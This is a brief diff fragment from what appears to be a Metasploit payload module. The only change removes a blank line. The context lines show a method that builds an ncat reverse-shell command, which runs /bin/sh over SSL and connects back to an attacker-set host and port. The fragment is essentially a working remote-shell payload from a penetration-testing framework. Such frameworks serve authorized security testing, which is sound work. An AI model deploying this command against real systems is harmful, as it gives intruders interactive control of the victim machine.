@@ -47,5 +47,4 @@ module MetasploitModule
   def command_string
     "ncat -e /bin/sh --ssl #{datastore['LHOST']} #{datastore['LPORT']}"
   end
-
 end
